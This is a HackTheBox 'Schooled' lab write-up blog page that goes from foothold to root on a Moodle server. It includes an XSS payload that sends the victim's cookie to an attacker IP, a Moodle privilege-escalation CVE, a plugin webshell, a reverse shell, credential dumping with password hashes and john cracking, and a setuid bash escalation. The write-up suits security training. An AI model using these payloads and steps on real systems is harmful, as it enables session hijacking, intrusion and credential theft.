@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<title>Schooled - HackTheBox machine :: RoundofThree</title>
+<meta content="text/html; charset=utf-8" http-equiv="content-type"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<meta content="Rank: medium  Foothold 1- nmap discovered 22, 80, 33060 (mysqlx)
+2- Web clues:
+ contact.php -&amp;gt; 404 email: admissions@schooled.htb web address schooled.htb -&amp;gt; suggests there can be subdomains  3- wfuzz -c -u &amp;ldquo;http://schooled.htb/&amp;quot; -H &amp;ldquo;Host:FUZZ.schooled.htb&amp;rdquo; -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt &amp;ndash;hl 461 (Hide those whose line is 461).
+Found moodle.schooled.htb.
+4- Self enroll in Maths. Read announcements. The teacher Manuel Philips will check himself when we set the MoodleNet profile." name="description"/>
+<meta content="[hacking kaggle blog resume hackthebox machine-learning reverse-engineering infosec]" name="keywords"/>
+<meta content="noodp" name="robots"/>
+<link href="/labs/schooled/" rel="canonical"/>
+<link href="/assets/style.css" rel="stylesheet"/>
+<link href="/img/apple-touch-icon-192x192.png" rel="apple-touch-icon"/>
+<link href="/favicon.png" rel="shortcut icon"/>
+<meta content="summary" name="twitter:card"/>
+<meta content="" name="twitter:site"/>
+<meta content="RoundofThree" name="twitter:creator"/>
+<meta content="en" property="og:locale"/>
+<meta content="article" property="og:type"/>
+<meta content="Schooled - HackTheBox machine" property="og:title"/>
+<meta content="Rank: medium  Foothold 1- nmap discovered 22, 80, 33060 (mysqlx)
+2- Web clues:
+ contact.php -&amp;gt; 404 email: admissions@schooled.htb web address schooled.htb -&amp;gt; suggests there can be subdomains  3- wfuzz -c -u &amp;ldquo;http://schooled.htb/&amp;quot; -H &amp;ldquo;Host:FUZZ.schooled.htb&amp;rdquo; -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt &amp;ndash;hl 461 (Hide those whose line is 461).
+Found moodle.schooled.htb.
+4- Self enroll in Maths. Read announcements. The teacher Manuel Philips will check himself when we set the MoodleNet profile." property="og:description"/>
+<meta content="/labs/schooled/" property="og:url"/>
+<meta content="RoundofThree" property="og:site_name"/>
+<meta content="/favicon.png" property="og:image"/>
+<meta content="2048" property="og:image:width"/>
+<meta content="1024" property="og:image:height"/>
+<meta content="2021-09-07 13:19:47 +0200 +0200" property="article:published_time"/>
+</head>
+<body class="orange">
+<div class="container center headings--one-size">
+<header class="header">
+<div class="header__inner">
+<div class="header__logo">
+<a href="/">
+<div class="logo">
+    RoundofThree
+  </div>
+</a>
+</div>
+<div class="menu-trigger">menu</div>
+</div>
+<nav class="menu">
+<ul class="menu__inner menu__inner--desktop">
+<li><a href="/general">General</a></li>
+<li><a href="/labs">Labs</a></li>
+<li><a href="/research">Research</a></li>
+<li><a href="/">Whoami</a></li>
+</ul>
+<ul class="menu__inner menu__inner--mobile">
+<li><a href="/general">General</a></li>
+<li><a href="/labs">Labs</a></li>
+<li><a href="/research">Research</a></li>
+<li><a href="/">Whoami</a></li>
+</ul>
+</nav>
+</header>
+<form action="/search/" id="search" method="get">
+<label for="search-input" hidden="">Search site</label>
+<input id="search-input" name="query" placeholder="Type here to search" type="text"/>
+<input type="submit" value="search"/>
+</form>
+<div class="content">
+<div class="post">
+<h1 class="post-title">
+<a href="/labs/schooled/">Schooled - HackTheBox machine</a></h1>
+<div class="post-meta">
+<span class="post-date">
+        2021-09-07 
+      </span>
+<span class="post-author">:: RoundofThree</span>
+</div>
+<span class="post-tags">
+    
+    #<a href="/tags/hackthebox/">HackTheBox</a> 
+    
+  </span>
+<div class="post-content"><div>
+<ul>
+<li>Rank: medium</li>
+</ul>
+<h2 id="foothold">Foothold<a arialabel="Anchor" class="hanchor" href="#foothold">⌗</a> </h2>
+<p>1- nmap discovered 22, 80, 33060 (mysqlx)</p>
+<p>2- Web clues:</p>
+<ul>
+<li>contact.php -&gt; 404</li>
+<li>email: <a href="mailto:admissions@schooled.htb">admissions@schooled.htb</a></li>
+<li>web address schooled.htb -&gt; suggests there can be subdomains</li>
+</ul>
+<p>3- wfuzz -c -u “<a href="http://schooled.htb/%22">http://schooled.htb/"</a> -H “Host:FUZZ.schooled.htb” -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt –hl 461 (Hide those whose line is 461).</p>
+<p>Found moodle.schooled.htb.</p>
+<p>4- Self enroll in Maths. Read announcements. The teacher Manuel Philips will check himself when we set the MoodleNet profile.</p>
+<p>5- Check for XSS in every input (description, chat). Steal the cookie to access higher role (Teacher role). Wait for a long time…
+Because the teacher will check for our profile, set the MoodleNet to</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-js" data-lang="js"><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span><span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Image</span>;<span style="color:#a6e22e">i</span>.<span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">"http://10.10.14.23:8888/?"</span><span style="color:#f92672">+</span>document.<span style="color:#a6e22e">cookie</span>;<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+</code></pre></div><p>Description is not vulnerable.</p>
+<p>10.10.10.234 - - [02/Aug/2021 10:48:40] “GET /?MoodleSession=g6913p6t2kegeg9n1dgee9qm12 HTTP/1.1” 200 -</p>
+<p>6- CVE-2020-14321. This vulnerability allows Course enrolments to allow privilege escalation from teacher role into manager role.</p>
+<p>Burpsuite when enrolling a new user. Change userlist param to current account id (24?) and set roletoassign to 1 (manager).</p>
+<p>7- As Liann Carter, go to Site administration page at <a href="http://moodle.schooled.htb/moodle/admin/search.php">http://moodle.schooled.htb/moodle/admin/search.php</a>.</p>
+<p>Moodle 3.9 (Build: 20200615).</p>
+<p>// 8- Go to Users / Edit roles / Manager / Edit / Save changes –&gt; use burpsuite to change everything to 1 (allowed).</p>
+<p>9- Go to Plugins / Install plugins / submit rce.zip and install.</p>
+<p>// 10- Visit <a href="http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php">http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php</a> to activate the webshell.</p>
+<p>11- Relay a reverse shell with pentestmonket php reverse shell as www-data user.</p>
+<p>12- Cat the apache config to get MySQL credentials.</p>
+<blockquote>
+<p>find / -name ‘config.php’ 2&gt;/dev/null
+–&gt; /usr/local/www/apache24/data/moodle/config.php</p>
+</blockquote>
+<p>13- Connect to mysql and retrieve all credentials for moodle.</p>
+<blockquote>
+<p>find / -name mysql 2&gt;/dev/null
+–&gt; /usr/local/bin/mysql
+/usr/local/bin/mysql -u moodle –password=PlaybookMaster2020 -e ‘use moodle; show tables;’
+–&gt; found mdl_user
+/usr/local/bin/mysql -u moodle –password=PlaybookMaster2020 -e ‘use moodle; select * from mdl_user;’
+–&gt; jamie password hash is $2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW
+–&gt; higgins jane -&gt; $2y$10$n9SrsMwmiU.egHN60RleAOauTK2XShvjsCS0tAR6m54hR1Bba6ni2
+–&gt; manuel philips -&gt; $2y$10$ZwxEs65Q0gO8rN8zpVGU2eYDvAoVmWYYEhHBPovIHr8HZGBvEYEYG
+–&gt; carter lianne -&gt; $2y$10$jw.KgN/SIpG2MAKvW8qdiub67JD7STqIER1VeRvAH4fs/DPF57JZe</p>
+</blockquote>
+<p>14- John crack the credentials.</p>
+<blockquote>
+<p>john –wordlist=/opt/SecLists/Passwords/Leaked-Databases/rockyou.txt tocrack.txt</p>
+</blockquote>
+<p>15- SSH into jamie:!QAZ2wsx</p>
+<h2 id="privilege-escalation">Privilege escalation<a arialabel="Anchor" class="hanchor" href="#privilege-escalation">⌗</a> </h2>
+<p>1- sudo -l to find pkg update and pkg install *
+2- Create a custom package that sets the SETUID bit in /bin/bash. See pkg_install.sh.
+3- bash -p (this option exploits the SETUID bit if set).</p>
+<p>root.txt: 85336d96f89869c69d073a90de2730b1</p>
+</div></div>
+</div>
+</div>
+<footer class="footer">
+<div class="footer__inner">
+<div class="copyright copyright--user">
+<span>© 2021 RoundofThree</span>
+</div>
+</div>
+</footer>
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+</div>
+</body>
+</html>
